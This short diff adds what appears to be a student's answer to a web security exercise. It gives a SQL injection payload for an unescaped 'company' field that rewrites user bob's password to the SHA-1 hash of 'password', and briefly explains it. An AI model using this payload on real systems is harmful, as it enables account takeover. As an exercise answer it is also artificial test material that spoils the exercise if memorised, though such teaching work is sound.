@@ -1,0 +1,8 @@
+"password"
+alice
+"name"="bob"
+"company"="', pass='5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' where name = 'bob'; -- "
+"email"="example@mail.com"
+
+Since the company field was not escaped so I was able to perform an injection there, making the password "password" in sha1 hash form to encrypt it and commented the rest out.
+I included an email field to be used because the account edit required that field to be used.
